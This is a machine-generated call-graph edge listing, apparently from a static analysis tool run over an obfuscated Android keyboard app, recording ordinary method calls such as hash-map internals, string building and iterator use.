SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i0, $r1, $r2, $r3) in <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r2) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int f(java.lang.Object)>($r2) in <ljb: void a()> ==> <ljd: int f(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljf: java.lang.Object p()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
VIRTUAL edge: $r12 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(9) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int b(java.lang.Object[],int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>($r0, $r2) in <iye: void D(boolean,java.lang.String,int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" cannot be negative but was: ") in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lid: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<idq: void <init>(java.lang.String,mag)>($r0, $r1) in <idq: idq a(java.lang.String,mag)> ==> <idq: void <init>(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r4 = staticinvoke <kes: java.lang.String k(nfe)>($r27) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void l(int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqr: lsa l()> ==> <lma: lkq k()>
VIRTUAL edge: virtualinvoke $r3.<lli: void c(java.util.Map$Entry)>($r6) in <hbv: void j()> ==> <lli: void c(java.util.Map$Entry)>
SPECIAL edge: specialinvoke r0.<android.app.Application: void <init>()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()> ==> <android.app.Application: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lnc: java.lang.Object next()>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r0) in <ojg: void v(java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
VIRTUAL edge: virtualinvoke $r14.<lkl: void h(java.lang.Object)>($r15) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: void h(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsh: lse h(java.util.logging.Level)>($r2) in <lsh: lsw a(java.util.logging.Level)> ==> <lsh: lse h(java.util.logging.Level)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r2.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r0, $r1, 0, 0) in <lsz: lsz c(java.lang.String,java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.ArrayList: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("tags", $r1, 0) in <lsk: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: $i0 = specialinvoke r0.<ljf: int n()>() in <ljf: java.util.Set f()> ==> <ljf: int n()>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i5) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $r0 = staticinvoke <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>($r1) in <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)> ==> <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
STATIC edge: $i1 = staticinvoke <ql: int a(int[],int,int)>($r1, $i2, 0) in <qj: int j()> ==> <ql: int a(int[],int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r2) in <ljd: int f(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(6) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "array") in <ql: int a(int[],int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(2) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segments", class "[Lj$/util/concurrent/o;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: $r3 = specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int z(int,int,int,int)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r28.<mag: void <init>(java.lang.String,int,int)>("TENOR_STICKER_SEARCH_METADATA", 28, 28) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>(4, $i0) in <izw: int ak(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $r3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>($r3, $r4) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>
STATIC edge: $r10 = staticinvoke <lum: lvt k()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lum: lvt k()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r3.<lvs: void <init>(java.lang.String,int)>("DOUBLE", 3) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke r0.<hbv: boolean o()>() in <hbv: void k(java.lang.Object,boolean)> ==> <hbv: boolean o()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r7) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lkf: void <init>()> ==> <lkx: void <init>()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "level") in <lsn: void <init>(java.util.logging.Level)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" component is already registered with a different value.") in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)> ==> <java.lang.Class: java.lang.String getName()>
STATIC edge: $i6 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>($r1, $r2, $r3) in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>(-1640531527) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>
VIRTUAL edge: $c6 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i5) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>("INSTANCE", 0) in <ldr: void <init>()> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>(r0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqn: lsa l()> ==> <lkq: lsb B()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnq: void <init>()> ==> <iec: void <init>()>
CLINIT edge: staticinvoke <lsh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsh: void <clinit>()>
CLINIT edge: staticinvoke <java.lang.Boolean: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Boolean: void <clinit>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int c()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: int hashCode()>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r5) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $r1 = staticinvoke <lri: java.lang.Object[] o(java.lang.Object[],int)>($r1, $i0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lri: java.lang.Object[] o(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, $r5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, 0, $r8, 0, $i3) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.String: void <init>(char[],int,int)>($r4, $i1, $i0) in <nzh: boolean f(ivv)> ==> <java.lang.String: void <init>(char[],int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean containsAll(java.util.Collection)>($r4) in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
VIRTUAL edge: $r3 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljd: java.util.Map m()> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<lts: java.lang.Object e(int)>($i1) in <lsn: boolean ac()> ==> <lsm: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.util.List asList(java.lang.Object[])>($r1) in <ose: void <clinit>()> ==> <java.util.Arrays: java.util.List asList(java.lang.Object[])>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Invalid private use tag, other subtag is not empty") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r9) in <lqs: boolean containsAll(java.util.Collection)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: int[] w()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r27 = staticinvoke <java.lang.Float: java.lang.Float valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Float: java.lang.Float valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbv: void <init>(java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsc: boolean g(java.util.logging.Level)>($r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsc: boolean g(java.util.logging.Level)>
SPECIAL edge: specialinvoke $r27.<java.lang.AssertionError: void <init>(java.lang.Object)>("Overflow of RecursionDepth (possible error in core library)") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(4) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfb: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object h(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
STATIC edge: $i3 = staticinvoke <ql: int a(int[],int,int)>($r2, $i2, $i0) in <qj: int i(java.lang.Object,int)> ==> <ql: int a(int[],int,int)>
CLINIT edge: staticinvoke <ose: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ose: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<bek: void <init>(java.nio.ByteBuffer)>($r0) in <bel: java.io.InputStream a(java.nio.ByteBuffer)> ==> <bek: void <init>(java.nio.ByteBuffer)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void t(int)> ==> <ljd: int[] w()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r14.<lkt: void <init>(int)>($i0) in <lmb: lme f()> ==> <lkt: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<lin: void <init>(ldp,lqd)>($r1, r0) in <lqd: lqd d(ldp)> ==> <lin: void <init>(ldp,lqd)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i2) in <lma: int e(int)> ==> <java.lang.Integer: int highestOneBit(int)>
CLINIT edge: staticinvoke <lql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lql: void <clinit>()>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 65, 90, 32) in <iwt: void f(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljb: void a()> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <liy: int size()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(0) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqr: lsa l()> ==> <lkq: lsb B()>
INTERFACE edge: $z1 = interfaceinvoke $r0.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lqq: void <init>(java.lang.Object,java.lang.Object[],int)> ==> <lkx: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r9 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>($r1) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lsj: void <init>(java.lang.Class)>(class "Ljava/lang/Object;") in <lsl: void <clinit>()> ==> <lsj: void <init>(java.lang.Class)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>($r7, $r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>(0, 0) in <lnd: void <init>(java.lang.Object[])> ==> <lsb: void <init>(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r1) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lnc: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <lwf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwf: void <clinit>()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<lsz: boolean equals(java.lang.Object)>($r6) in <lsn: boolean ac()> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
